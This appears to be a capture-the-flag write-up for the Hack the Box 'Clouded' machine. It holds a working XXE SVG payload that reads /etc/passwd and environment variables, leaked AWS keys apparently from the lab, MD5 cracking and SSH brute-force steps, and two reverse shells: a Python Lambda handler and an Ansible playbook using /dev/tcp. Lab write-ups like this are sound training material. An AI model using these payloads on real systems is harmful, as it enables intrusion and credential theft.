# Clouded
Clouded is the third of the three full pwn challenges that we solved with *GCC* during the *Hack the Box University CTF 2024: Binary Badlands*

```
Nmap scan report for clouded.htb (10.129.231.169)
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Clouded
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let’s check the web page!

There isn’t much interesting information on this website except a page where we can upload a file to get a shareable link. The only allowed extensions are pdf,docx,png and svg. There is also another page “about” which gives us some lore and some information about how the platform works, the one line keeping my attention being “Files scanned for malicious content and rogue metadata” which suggest an injection attack could be exploited.

![Website upload page](/images/website_upload_page.png)

We can then download our file on a link like this one on local.clouded.htb:
`http://local.clouded.htb/uploads/file_FRSAWhTLhm.pdf`

This is what the upload post request looks like:
```
POST /upload/prod/lambda HTTP/1.1
Host: clouded.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://clouded.htb/upload.html
Content-Type: application/json
Content-Length: 53
Origin: http://clouded.htb
Connection: keep-alive
Priority: u=4

{"filename":"test.pdf","fileData":"aGVsbG8gd29ybGQK"}
```

We see that the POST request is pointing towards /upload/prod/lambda and the fileData are encoded in base64. After some testing we realised we could put anything in the fileData field and we would be able to download the file back without any issues. 

The exception being with .svg files. When we would upload an svg file without the correct format we would get an error.

We then tried to do some recon on our newly found domain local.clouded.htb and we found out it was an AWS bucket running behind which used a restAPI and an AWS lambda function.

![AWS lambda](/images/aws_lambda.png)

After a bit more searching and testing we managed to find an XXE injection in the upload feature of the website!

We this payload:


`
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
`
When we downloaded the file from the url the site gave us it had the content of /etc/passwd in it !

‘
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
rngd:x:996:994:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
slicer:x:995:992::/tmp:/sbin/nologin
sb_logger:x:994:991::/tmp:/sbin/nologin
`

Using the same method we were able to extract the environment variables located on /proc/self/environ:

`
cat file_8m6ImlfKiB.svg 
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">AWS_LAMBDA_FUNCTION_VERSION=$LATESTEDGE_PORT=4566HOSTNAME=e1e35b1f5338_LAMBDA_CONTROL_SOCKET=14AWS_LAMBDA_FUNCTION_TIMEOUT=10LOCALSTACK_HOSTNAME=172.18.0.2AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/UploadToS3LAMBDA_TASK_ROOT=/var/taskLD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/libAWS_LAMBDA_RUNTIME_API=127.0.0.1:9001AWS_LAMBDA_LOG_STREAM_NAME=2024/12/17/[$LATEST]54d2b33123587737c87e8aed538da00b_LAMBDA_SHARED_MEM_FD=11AWS_EXECUTION_ENV=AWS_Lambda_python3.8_LAMBDA_RUNTIME_LOAD_TIME=1530232235231AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000AWS_LAMBDA_FUNCTION_NAME=UploadToS3PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin_LAMBDA_LOG_FD=9AWS_DEFAULT_REGION=us-east-1PWD=/var/taskAWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDA_RUNTIME_DIR=/var/runtimeLANG=en_US.UTF-8TZ=:UTCAWS_REGION=us-east-1AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL=0HOME=/home/sbx_user1051AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:UploadToS3_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2_AWS_XRAY_DAEMON_PORT=2000_X_AMZN_TRACE_ID=Root=1-dc99d00f-c079a84d433534434534ef0d;Parent=91ed514f1e5c03b2;Sampled=1_LAMBDA_SB_ID=7AWS_XRAY_CONTEXT_MISSING=LOG_ERROR_LAMBDA_CONSOLE_SOCKET=16AWS_LAMBDA_COGNITO_IDENTITY={}_HANDLER=handler.lambda_handlerDOCKER_LAMBDA_USE_STDIN=1AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1536</text>
</svg>
`

We will use the data we extracted above to login to the AWS bucket and list its content !

AWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDAAWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL

![AWS login](/images/aws_login.png)

We can see that there is a folder containing all of the file uploaded since the beginning called “uploads” and another one called “clouded-internal”, in the second folder we find a database called backup.db so we download it:

`
$ aws --endpoint=http://local.clouded.htb/ s3 sync s3://clouded-internal .
download: s3://clouded-internal/backup.db to ./backup.db 
`
We open the .db file using sqlitebrowser:

![Database](/images/database.png)

In the database there are 50 rows containing each a first and last name as well as an md5 password, all of them got cracked in a few seconds using john.

`
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
`

This is the moment things got a little messed up. With the information we had, we tried to brute-force an SSH login using Hydra and a variety of combinations such as FirstName:password, LastName:password, and FirstName.LastName:password, but it was in vain -_-.

We then opted to list the lambda functions on the aws bucket:

`
┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://local.clouded.htb/ lambda list-functions --output json
{
    "Functions": [
        {
            "FunctionName": "UploadToS3",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:UploadToS3",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::000000000000:role/LambdaS3Access",
            "Handler": "handler.lambda_handler",
            "CodeSize": 21510285,
            "Description": "",
            "Timeout": 10,
            "LastModified": "2024-12-17T08:27:57.309+0000",
            "CodeSha256": "CxUb8kp80KqTa/tzdVQeTVFqo0Nhs0W2AwRKeuplCXE=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "Environment": {
                "Variables": {
                    "AWS_ACCESS_KEY_ID": "AKIA5M34BDN8GCJGRFFB",
                    "AWS_SECRET_ACCESS_KEY": "eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUY"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "54415165-b344-4c0d-b815-ee1d532c62d0",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
`
The function which was running on the bucket is called UploadToS3 and it is using python3, we then proceeded to search for a way to execute code by using the function feature.

After some trial and error we managed to upload our function which executes our script “handler.py”

`
└─$ cat handler.py 
import socket,subprocess,os

def handler(event, context):
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.10.14.16", 4444))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  p = subprocess.call(["/bin/bash", "-i"])
`
![handler function upload](/images/handler_function.png)

We can see that we successfully uploaded our function and we have executed using `lambda invoke`

![lambda revshell](/images/lambda_revshell.png)

We got a reverse shell, but after attempting privilege escalation on the machine, we realized there was a problem: there were almost no binaries, and there were no interesting files. At that moment, we thought that maybe this was out of scope, and we were right!

After experimenting for a while, we decided to try our luck again at brute-forcing the SSH login, as we were convinced the solution had something to do with the database we found earlier and it was the case !

Using this script we managed to get a big list of variations of the  credentials found in the db and one of them miraculously worked:

```py
#!/usr/bin/env python3
import sys
import os.path
FILE_USERS = open("users_wordlist.txt", "w")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: {} names.txt".format((sys.argv[0])))
        sys.exit(0)

    if not os.path.exists(sys.argv[1]):
        print("{} not found".format(sys.argv[1]))
        sys.exit(0)

    for line in open(sys.argv[1]):
        tokens = line.split(" ")

        # skip empty lines
        if len(tokens) < 1:
            continue

        fname = tokens[0].lower()
        lname = tokens[1].lower()
        passwd = tokens[2]
        FILE_USERS.write(fname + lname + ":"+passwd)           # johndoe
        FILE_USERS.write(lname + fname+ ":"+passwd)           # doejohn
        FILE_USERS.write(fname + "." + lname+ ":"+passwd)     # john.doe
        FILE_USERS.write(lname + "." + fname+ ":"+passwd)     # doe.john
        FILE_USERS.write(lname + fname[0]+ ":"+passwd)        # doej
        FILE_USERS.write(fname[0] + lname+ ":"+passwd)        # jdoe
        FILE_USERS.write(lname[0] + fname+ ":"+passwd)        # djoe
        FILE_USERS.write(fname[0] + "." + lname+ ":"+passwd)  # j.doe
        FILE_USERS.write(lname[0] + "." + fname+ ":"+passwd)  # d.john
        FILE_USERS.write(fname+ ":"+passwd)                   # john
        FILE_USERS.write(lname+ ":"+passwd)                   # joe
FILE_USERS.close()
```
![hydra](/images/hydra.png)

We can now ssh login onto the machine and find the first flag !

![userflag](/images/userflag.png)

We then upload linpeas and pspy on the machine using a basic python http server and we execute it:


‘
sudo python3 -m http.server #Host
wget 10.10.10.10:8000/linpeas.sh
wget 10.10.10.10:8000/pspy64 #Victim
‘
We don’t find anything very interesting in linpeas but in pspy we can see that there is a cronjob running:

![playbook](/images/playbook.png)

We can add another .yml file in /opt/infra-setup to get get a reverse shell as the root user:

`nano shell.yml`
```
- hosts: localhost
  tasks:
    - name: Reverse shell
      command: /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

And boom we get a root reverse shell and we have our root flag!:

![rootflag](/images/rootflag.png)
